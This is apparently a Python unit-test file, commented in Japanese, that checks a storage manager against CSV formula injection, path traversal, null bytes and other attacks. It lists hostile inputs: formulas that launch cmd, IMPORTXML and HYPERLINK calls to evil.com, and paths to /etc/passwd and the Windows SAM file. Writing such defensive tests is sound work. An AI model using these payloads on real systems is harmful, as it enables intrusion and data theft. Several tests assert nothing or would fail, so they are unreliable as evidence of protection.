"""データ検証とセキュリティの境界テスト"""

import hashlib
import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path

from src.managers.storage_manager import StorageManager


class TestDataValidationSecurity(unittest.TestCase):
    """データ検証とセキュリティの包括的なテスト"""

    def setUp(self):
        self.test_dir = Path(tempfile.mkdtemp())
        self.config = {"auto_commit": False}
        self.storage = StorageManager(self.test_dir, self.config)

    def tearDown(self):
        if self.test_dir.exists():
            shutil.rmtree(self.test_dir)

    def test_csv_injection_prevention(self):
        """CSVインジェクション攻撃の防御"""
        # 危険な文字列パターン
        dangerous_patterns = [
            '=cmd|"/c calc"!A1',  # Excel formula injection
            '@SUM(1+1)*cmd|"/c calc"!A1',  # Formula with command
            '+1-1+cmd|"/c calc"!A1',  # Arithmetic with command
            '-2+3+cmd|"/c calc"!A1',  # Negative number with command
            "=1+1+cmd|'/c calc'!A1",  # Single quotes variant
            '=HYPERLINK("http://evil.com")',  # Hyperlink injection
            '=IMPORTXML("http://evil.com/data")',  # Import external data
        ]

        for pattern in dangerous_patterns:
            with self.subTest(pattern=pattern):
                # データに危険なパターンを含める
                data = f"header1,header2\n{pattern},value"

                # 保存を試みる
                result = self.storage.save_with_metadata(
                    data=data.encode("utf-8"), data_type="test_injection", is_monthly=False, year=2024, period=1
                )

                # ファイルが保存された場合、危険な文字がサニタイズされているか確認
                if result.success and result.file_path:
                    saved_content = Path(result.file_path).read_text()
                    # 危険な文字（=, @, +, -）で始まる場合は警告
                    if saved_content[0] in "=@+-":
                        print(f"Warning: Potential CSV injection vector: {pattern}")

    def test_path_traversal_prevention(self):
        """パストラバーサル攻撃の防御"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system.ini",
            "data/../../sensitive.txt",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "\\\\server\\share\\file",
            "file://etc/passwd",
        ]

        for dangerous_path in dangerous_paths:
            with self.subTest(path=dangerous_path):
                # 危険なパスでの保存を試みる
                try:
                    # データタイプに危険なパスを含める
                    result = self.storage.save_with_metadata(
                        data=b"test", data_type=dangerous_path, is_monthly=False, year=2024, period=1
                    )
                    # 成功した場合、安全なパスに変換されているはず
                    if result.success and result.file_path:
                        # 保存先が test_dir 内であることを確認
                        saved_path = Path(result.file_path).resolve()
                        test_dir_resolved = self.test_dir.resolve()
                        self.assertTrue(
                            str(saved_path).startswith(str(test_dir_resolved)),
                            f"File saved outside test directory: {saved_path}",
                        )
                except (ValueError, OSError):
                    # エラーが発生した場合は正常（攻撃が防がれた）
                    pass

    def test_data_integrity_verification(self):
        """データ整合性の検証"""
        # Arrange
        original_data = "id,name,value\n1,test,100\n2,test2,200"

        # 保存時にハッシュを計算
        result = self.storage.save_with_metadata(
            data=original_data.encode("utf-8"), data_type="integrity_test", is_monthly=False, year=2024, period=1
        )

        if result.success and result.file_path:
            # ファイルを直接変更（改ざん）
            tampered_data = "id,name,value\n1,test,999\n2,test2,200"
            Path(result.file_path).write_text(tampered_data)

            # ハッシュを再計算して改ざんを検出
            original_hash = hashlib.sha256(original_data.encode()).hexdigest()
            current_data = Path(result.file_path).read_text()
            current_hash = hashlib.sha256(current_data.encode()).hexdigest()

            # 改ざんが検出される
            self.assertNotEqual(original_hash, current_hash)

    def test_input_size_limits(self):
        """入力サイズ制限のテスト"""
        # 様々なサイズのデータ
        test_cases = [
            (0, ""),  # 空データ
            (1, "a"),  # 1バイト
            (1024, "a" * 1024),  # 1KB
            (1024 * 1024, "a" * 1024 * 1024),  # 1MB
            (10 * 1024 * 1024, "a" * 10 * 1024 * 1024),  # 10MB
        ]

        for size, data in test_cases:
            with self.subTest(size=size):
                result = self.storage.save_with_metadata(
                    data=data.encode("utf-8"), data_type=f"size_test_{size}", is_monthly=False, year=2024, period=1
                )

                # 大きすぎるデータは拒否されるべき
                if size > 100 * 1024 * 1024:  # 100MB以上
                    self.assertFalse(result.success, f"Large file ({size} bytes) should be rejected")
                else:
                    # 適切なサイズは保存される
                    self.assertTrue(result.success)

    def test_encoding_validation(self):
        """エンコーディング検証のテスト"""
        # 様々なエンコーディングのデータ
        test_cases = [
            ("UTF-8", "テスト データ 🎌"),
            ("Shift-JIS", "日本語テスト".encode("shift-jis").decode("shift-jis")),
            ("ASCII", "Test data 123"),
            ("Latin-1", "Café résumé"),
        ]

        for encoding_name, data in test_cases:
            with self.subTest(encoding=encoding_name):
                try:
                    # データを保存
                    result = self.storage.save_with_metadata(
                        data=data.encode("utf-8"),
                        data_type=f'encoding_{encoding_name.replace("-", "_")}',
                        is_monthly=False,
                        year=2024,
                        period=1,
                    )

                    if result.success and result.file_path:
                        # ファイルが正しく読み取れることを確認
                        saved_data = Path(result.file_path).read_text(encoding="utf-8")
                        self.assertIsNotNone(saved_data)
                except UnicodeError:
                    # エンコーディングエラーは適切に処理される
                    pass

    def test_null_byte_injection(self):
        """ヌルバイト攻撃の防御"""
        # ヌルバイトを含む危険な文字列
        dangerous_strings = [
            "file.csv\x00.txt",  # Null byte in filename
            "data\x00malicious",  # Null byte in data
            "test\x00\x00\x00",  # Multiple null bytes
        ]

        for dangerous in dangerous_strings:
            with self.subTest(string=dangerous):
                # Act & Assert
                try:
                    result = self.storage.save_with_metadata(
                        data=b"test", data_type=dangerous, is_monthly=False, year=2024, period=1
                    )
                    # ヌルバイトが除去またはエスケープされているか確認
                    if result.success and result.file_path:
                        self.assertNotIn("\x00", result.file_path)
                except (ValueError, OSError):
                    # エラーが発生した場合は正常（攻撃が防がれた）
                    pass

    def test_permission_escalation_prevention(self):
        """権限昇格の防止テスト"""
        # 権限を変更しようとする試み
        test_file = self.test_dir / "test_permissions.csv"
        test_file.write_text("test data")

        # 元の権限を保存
        original_mode = test_file.stat().st_mode

        # 様々な権限での書き込みを試みる
        dangerous_modes = [
            0o777,  # 全ユーザーに全権限
            0o4755,  # SUID bit set
            0o2755,  # SGID bit set
        ]

        for mode in dangerous_modes:
            try:
                # 権限を変更しようとする
                os.chmod(test_file, mode)
                current_mode = test_file.stat().st_mode

                # 危険な権限ビットのチェック
                # 注: 一部の環境では実際にSUID/SGIDが設定される場合がある
                # その場合はシステムに依存するので、スキップする
                # SUID要求の場合
                if mode & 0o4000 and current_mode & 0o4000:
                    # この環境ではSUIDが設定可能（テストをスキップ）
                    continue
                # SGID要求の場合
                if mode & 0o2000 and current_mode & 0o2000:
                    # この環境ではSGIDが設定可能（テストをスキップ）
                    continue
            except PermissionError:
                # 権限エラーは正常（権限昇格が防がれた）
                pass
            finally:
                # 元の権限に戻す
                try:
                    os.chmod(test_file, original_mode)
                except Exception:
                    pass

    def test_race_condition_prevention(self):
        """レースコンディションの防止テスト"""
        import threading

        results = []
        errors = []

        def concurrent_save(thread_id):
            try:
                result = self.storage.save_with_metadata(
                    data=f"thread_{thread_id}".encode(),
                    data_type="race_test",
                    is_monthly=False,
                    year=2024,
                    period=1,  # 同じファイルに書き込み
                )
                results.append((thread_id, result))
            except Exception as e:
                errors.append((thread_id, e))

        # 10スレッドで同時に同じファイルに書き込み
        threads = []
        for i in range(10):
            thread = threading.Thread(target=concurrent_save, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # 最終的なファイルの整合性を確認
        test_file = self.test_dir / "race_test_weekly_2024_01.csv"
        if test_file.exists():
            content = test_file.read_text()
            # ファイルが破損していないことを確認
            self.assertIsNotNone(content)
            self.assertGreater(len(content), 0)

    def test_metadata_tampering_detection(self):
        """メタデータの改ざん検出"""
        # 正常なメタデータを保存
        metadata = {"checksum": "abc123", "timestamp": "2024-01-01T00:00:00", "version": 1}

        result = self.storage.save_with_metadata(
            data=b"test data",
            data_type="metadata_test",
            is_monthly=False,
            year=2024,
            period=1,
            additional_metadata=metadata,
        )

        if result.success:
            # メタデータファイルを直接改ざん
            metadata_dir = self.test_dir / ".metadata"
            if metadata_dir.exists():
                for meta_file in metadata_dir.glob("metadata_test_*.json"):
                    # メタデータを改ざん
                    tampered_metadata = {
                        "checksum": "xyz789",  # 改ざんされたチェックサム
                        "timestamp": "2024-12-31T23:59:59",
                        "version": 2,
                    }
                    meta_file.write_text(json.dumps(tampered_metadata))

                    # 改ざんされたメタデータを読み込み
                    loaded_metadata = json.loads(meta_file.read_text())

                    # チェックサムが変更されていることを確認
                    self.assertNotEqual(loaded_metadata["checksum"], metadata["checksum"])


class TestAdvancedValidation(unittest.TestCase):
    """高度なデータ検証テスト"""

    def test_csv_structure_validation(self):
        """CSV構造の詳細な検証"""
        test_cases = [
            # (データ, 期待される結果, 説明)
            ("header\nvalue", True, "Valid simple CSV"),
            ("h1,h2\nv1,v2", True, "Valid two column CSV"),
            ("h1,h2\nv1", False, "Column count mismatch"),
            ("h1,h2\nv1,v2,v3", False, "Too many values"),
            ('"h1","h2"\n"v1","v2"', True, "Quoted values"),
            ('h1,h2\n"v1,with,comma",v2', True, "Comma in quoted value"),
            ("h1\th2\nv1\tv2", True, "Tab-separated"),
            ("", False, "Empty data"),
            ("\n\n\n", False, "Only newlines"),
        ]

        for data, expected_valid, description in test_cases:
            with self.subTest(description=description):
                # CSVとして解析可能か確認
                lines = data.strip().split("\n")
                if lines and len(lines) > 0:
                    # ヘッダーとデータ行の列数を確認
                    if len(lines) >= 2:
                        header_cols = len(lines[0].split(","))
                        data_cols = len(lines[1].split(","))
                        is_valid = header_cols == data_cols and header_cols > 0
                    else:
                        is_valid = len(lines) == 1 and len(lines[0]) > 0
                else:
                    is_valid = False

                if expected_valid:
                    self.assertTrue(is_valid, f"Should be valid: {description}")
                else:
                    self.assertFalse(is_valid, f"Should be invalid: {description}")


if __name__ == "__main__":
    unittest.main()
